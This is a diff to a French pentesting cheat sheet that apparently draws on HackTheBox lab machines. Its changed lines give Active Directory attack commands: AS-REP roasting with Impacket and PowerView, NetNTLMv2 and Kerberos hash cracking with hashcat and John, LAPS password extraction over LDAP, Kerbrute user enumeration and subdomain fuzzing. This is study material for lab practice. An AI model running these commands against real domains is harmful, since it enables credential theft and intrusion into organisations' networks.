@@ -29,7 +29,7 @@ Invoke-Inveigh -ConsoleOutput Y -NBNS Y -LLMNR Y -FileOutput Y
 
 ```bash
 # Avec Hashcat (mode 5600)
-hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt --force
 
 # Avec John the Ripper
 john --format=netntlmv2 captured_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
@@ -74,7 +74,7 @@ crackmapexec smb 172.16.5.5 -u username -p password --users | grep "badpwdcount"
 GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt
 
 # Avec PowerView
-Get-DomainUser -PreauthNotRequired | select samaccountname
+Get-DomainUser -PreauthNotRequired | select samaccountname,useraccountcontrol,userprincipalname
 ```
 
 ### Craquage des hashes AS-REP
@@ -135,14 +135,14 @@ hydra -L users.txt -P passwords.txt -f 192.168.1.10 https-post-form "/owa/auth.o
 #### Énumération LDAP pour mots de passe (Hutch)
 Il est parfois possible d'extraire directement des mots de passe LAPS via LDAP:
 ```bash
-ldapsearch -x -H 'ldap://192.168.x.x' -D 'domaine\utilisateur' -w 'MotDePasse' -b 'dc=domaine,dc=tld' "(ms-MCS-AdmPwd=)" ms-MCS-AdmPwd
+ldapsearch -x -H 'ldap://192.168.x.x' -D 'domaine\utilisateur' -w 'MotDePasse' -b 'dc=domaine,dc=tld' "(ms-MCS-AdmPwd=)" ms-MCS-AdmPwd
 ```
 
 Cette commande recherche spécifiquement l'attribut `ms-MCS-AdmPwd` qui contient les mots de passe LAPS en clair stockés dans Active Directory.
 ### Fuzzing de sous-domaines (Shibboleth)
 Utiliser wfuzz pour découvrir des sous-domaines cachés:
 ```bash
-wfuzz -u http://domaine.tld -H "Host: FUZZ.domaine.tld" -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --hw 26
+wfuzz -u http://domaine.tld -H "Host: FUZZ.domaine.tld" -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --hw 26
 ```
 Le paramètre `--hw 26` ignore les réponses ayant exactement 26 mots (utile pour filtrer les réponses "page non trouvée" standard).
 ### Analyse de métadonnées de fichiers (Intelligence, Reel)
@@ -157,15 +157,15 @@ Le paramètre `--hw 26` ignore les réponses ayant exactement 26 mots (utile pou
 #### Kerberos Pre-Authentication désactivée (Forest, Sauna)
 Identifier et exploiter les utilisateurs dont la pré-authentification Kerberos est désactivée:
 ```bash
-# Avec Impacket
-GetNPUsers.py domaine.tld/ -dc-ip 10.10.10.x -request -format hashcat
+# Avec Impacket
+GetNPUsers.py domaine.tld/ -dc-ip 10.10.10.x -request -format hashcat
 
-# Avec Kerbrute (alternative)
-kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt
+# Avec Kerbrute (alternative)
+kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt
 ```
 
 Les hash obtenus peuvent être crackés avec Hashcat (mode 18200):
 ```bash
-hashcat -m 18200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 18200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
 ```
 Cette technique fonctionne car la pré-authentification désactivée permet d'obtenir un TGT chiffré avec la clé de l'utilisateur (dérivée de son mot de passe), qui peut ensuite être craqué hors ligne.
